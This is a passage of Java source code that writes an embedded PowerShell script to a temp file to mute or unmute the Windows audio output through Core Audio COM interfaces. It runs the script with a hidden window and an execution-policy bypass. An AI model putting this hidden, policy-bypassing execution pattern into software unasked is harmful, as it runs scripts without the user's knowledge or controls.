                    "[Guid(\"A95664D2-9614-4F35-A746-DE8DB63617E6\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\n" +
                    "interface IMMDeviceEnumerator\n" +
                    "{\n" +
                    "    int f(); // Unused\n" +
                    "    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);\n" +
                    "}\n" +
                    "[ComImport, Guid(\"BCDE0395-E52F-467C-8E3D-C4579291692E\")] class MMDeviceEnumeratorComObject { }\n" +
                    "public class Audio\n" +
                    "{\n" +
                    "    static IAudioEndpointVolume Vol()\n" +
                    "    {\n" +
                    "        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;\n" +
                    "        IMMDevice dev = null;\n" +
                    "        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));\n" +
                    "        IAudioEndpointVolume epv = null;\n" +
                    "        var epvid = typeof(IAudioEndpointVolume).GUID;\n" +
                    "        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));\n" +
                    "        return epv;\n" +
                    "    }\n" +
                    "    public static float Volume\n" +
                    "    {\n" +
                    "        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }\n" +
                    "        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }\n" +
                    "    }\n" +
                    "    public static bool Mute\n" +
                    "    {\n" +
                    "        get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }\n" +
                    "        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }\n" +
                    "    }\n" +
                    "}\n" +
                    "'@\n" +
                    "[audio]::Mute = $" + mute;
            // Executing the command
            File file = File.createTempFile("AudioUp", ".ps1");
            FileWriter fw = new java.io.FileWriter(file);
            fw.write(command);
            fw.close();
            Process powerShellProcess = Runtime.getRuntime().exec("powershell.exe -windowStyle hidden -Exec Bypass /c \"" + file.getPath() + "\"");
            // Getting the results
            powerShellProcess.getOutputStream().close();
            String line;
            System.out.println("Standard Output:");
            BufferedReader stdout = new BufferedReader(new InputStreamReader(
                    powerShellProcess.getInputStream()));
            while ((line = stdout.readLine()) != null) {
                System.out.println(line);
            }
            stdout.close();
            System.out.println("Standard Error:");
            BufferedReader stderr = new BufferedReader(new InputStreamReader(
                    powerShellProcess.getErrorStream()));
            while ((line = stderr.readLine()) != null) {
                System.out.println(line);
            }
            stderr.close();
            System.out.println("Done");
            file.delete();
        } catch (Exception e) {
            System.out.println(e.toString());
        }
    }

    public static boolean isValidURL(String urlString) {
        try {
            URL url = new URL(urlString);
            url.toURI();
            return true;
        } catch (Exception exception) {
            return false;
        }
    }
}
